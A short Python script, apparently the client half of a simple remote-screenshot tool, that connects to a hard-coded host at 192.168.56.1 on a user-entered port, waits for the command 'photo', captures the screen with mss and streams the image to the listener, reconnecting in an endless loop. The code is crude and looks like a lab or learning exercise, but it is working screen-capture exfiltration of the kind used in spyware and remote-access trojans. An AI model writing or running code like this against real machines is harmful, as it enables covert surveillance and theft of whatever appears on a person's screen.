import socket
import mss
import os
import sys


port=int(input("Enter the PORT --> "))

def send_photo(client_socket):
    with mss.mss() as sct:
        sct.shot(output='shia.png')
    file = open('shia.png', 'rb')
    image_data = file.read(100000000)

    while image_data:
        client_socket.send(image_data)
        image_data = file.read(100000000)

def client_program():
    host = "192.168.56.1"
    file_path = os.path.dirname(sys.executable)

    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((host, port))
    except:
        print('Unable to connect')


    data = client_socket.recv(2048)
    message = str(data.decode())
    if message=='photo':
        send_photo(client_socket)
        print(f"photo {file_path} succesful send!")

    client_socket.close()


if __name__ == '__main__':
    while True:
        client_program()